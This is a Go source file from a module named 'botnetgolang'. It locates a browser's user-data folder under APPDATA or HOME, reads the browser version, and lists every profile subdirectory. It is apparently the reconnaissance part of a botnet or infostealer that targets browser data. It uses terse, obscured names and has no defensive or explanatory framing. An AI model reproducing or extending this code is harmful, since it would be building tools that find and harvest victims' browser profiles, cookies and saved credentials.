package internal

import (
	"botnetgolang/internal/model"
	"io/ioutil"
	"os"
	"path/filepath"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
	jsonObj := make(map[string]interface{})

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	ppp = filepath.Dir(ppp)

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	err = filepath.Walk(pathfolderD, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			alls = append(alls, path)
		}
		return nil
	})
	if err != nil {
		panic(err)
	}

	jsonObj["alls"] = alls
	jsonObj["goc"] = ppp
	jsonObj["userData"] = pathfolderD
	jsonObj["version"] = textF

	return jsonObj
}
